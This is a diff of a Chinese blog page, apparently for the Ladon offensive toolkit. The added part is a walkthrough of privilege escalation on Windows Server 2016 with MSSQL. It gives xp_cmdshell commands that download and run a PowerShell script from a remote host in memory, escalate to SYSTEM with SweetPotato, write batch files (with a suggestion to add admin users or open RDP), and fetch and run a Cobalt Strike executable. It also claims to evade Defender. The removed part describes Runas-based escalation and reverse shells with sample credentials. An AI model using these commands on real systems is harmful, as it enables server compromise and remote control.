@@ -26,7 +26,8 @@
 
 
 
-前言Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runa...">
+测试环境Windows Server 2016SQL: 13.0.1601.5Microsoft Windows [Version 10.0.14393]
+Ladon本地用户权限提权网...">
 
 
 <meta name="robots" content="all">
@@ -168,19 +169,17 @@ Visit <span id="busuanzi_value_page_pv"></span>
 %>
 </%></p>
 
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</p>
-<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1.本机用户密码验证（权限不够读不到帐密或HASH的情况下，验证用户是否使用某个已知密码）<br>2.SYSTEM权限降权，SYS权限下以用户身份执行命令，实现会话穿透，或访问特定用户的DBAPI加密数据<br>3.低权限用户提权，网络服务帐户或用户权限下使用管理员权限来执行一些必须管理员才能执行的命令<br>4.浏览器密码读取，本机存在多个用户，需要读取对应用户保存帐密（DBAPI），如Chrome、Firefox<br>5.以指定用户权限反弹SHELL，当然也可以转发特定交互式命令行程序</p>
-<p>提示：Runas条件是有帐密，提权降权也可使用GetSystem，无需帐密只需指定对应用户权限进程即可</p>
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Runas user pass cmd</span><br><span class="line">Ladon Runas user pass cmd domain</span><br><span class="line">Ladon RunasCS user pass cmd.exe ip port</span><br></pre></td></tr></table></figure>
-
-<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>当前机器默认开启UAC，登陆用户为null，管理员用户为k8gege，默认管理员用户为Administrator</p>
-<h3 id="Uac权限"><a href="#Uac权限" class="headerlink" title="Uac权限"></a>Uac权限</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p>
-<h3 id="Admin权限"><a href="#Admin权限" class="headerlink" title="Admin权限"></a>Admin权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
-<h3 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/runas_lpe_2003.png"></p>
-<h3 id="Service权限"><a href="#Service权限" class="headerlink" title="Service权限"></a>Service权限</h3><p>服务权限下模拟登陆自己添加的管理员用户执行CMD命令<br>Ladon Runas k8gege k8gege520 whoami</p>
-<p>PS：实战某台机器曾经提权至管理员，由于提权不稳定曾给其添加了一个用户，发现再次使用Potato依旧无法以高极限执行命令，突然想起之前已加入一个管理员用户，使用非交互式Runas执行命令提权（已有目标帐密在低权限webshell下以高权限用户执行命令同理）</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/runas_lpe_2003.png"></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Windows Server 2016<br>SQL: 13.0.1601.5<br>Microsoft Windows [Version 10.0.14393]</p>
+<h3 id="Ladon本地用户权限提权"><a href="#Ladon本地用户权限提权" class="headerlink" title="Ladon本地用户权限提权"></a>Ladon本地用户权限提权</h3><p>网上找了些LPE，发现直接被Defender杀了，病毒库更新至2021.1.19，Ladon没被杀，可通过BypassUac提权<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/win2016_user_lpe.png"></p>
+<h3 id="MSSQL远程加载Ladon提权"><a href="#MSSQL远程加载Ladon提权" class="headerlink" title="MSSQL远程加载Ladon提权"></a>MSSQL远程加载Ladon提权</h3><p>执行SQL查询权限为network service</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/sql2016_whoami.png"></p>
+<h4 id="远程内存加载PowerLadon提权"><a href="#远程内存加载PowerLadon提权" class="headerlink" title="远程内存加载PowerLadon提权"></a>远程内存加载PowerLadon提权</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxxxx.800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxxxx.800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “whoami””‘</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/win2016_mssql2016.png"></p>
+<h4 id="ECHO写入BAT执行多行命令提权"><a href="#ECHO写入BAT执行多行命令提权" class="headerlink" title="ECHO写入BAT执行多行命令提权"></a>ECHO写入BAT执行多行命令提权</h4><p>exec master..xp_cmdshell ‘echo whoami &gt; c:\users\public\test.bat’</p>
+<p>可ECHO写入添加管理员用户命令或者开3389等操作（举一反三不要只懂WHOAMI）</p>
+<h4 id="使用SYSTEM权限执行BAT"><a href="#使用SYSTEM权限执行BAT" class="headerlink" title="使用SYSTEM权限执行BAT"></a>使用SYSTEM权限执行BAT</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “c:\users\public\test.bat””‘</p>
+<h4 id="Wget下载Coblat-Strkie的EXE"><a href="#Wget下载Coblat-Strkie的EXE" class="headerlink" title="Wget下载Coblat Strkie的EXE"></a>Wget下载Coblat Strkie的EXE</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon wget <a href="http://k8gege.org/cs.exe&quot;&#39;">http://k8gege.org/cs.exe&quot;&#39;</a></p>
+<h4 id="使用SYSTEM权限执行CS"><a href="#使用SYSTEM权限执行CS" class="headerlink" title="使用SYSTEM权限执行CS"></a>使用SYSTEM权限执行CS</h4><p>exec master..xp_cmdshell ‘powershell “IEX (New-Object Net.WebClient).DownloadString(‘’<a href="http://xxxx:800/Ladon.ps1&#39;&#39;" target="_blank" rel="noopener">http://xxxx:800/Ladon.ps1&#39;&#39;</a>); Ladon SweetPotato “c:\users\public\cs.exe””‘</p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
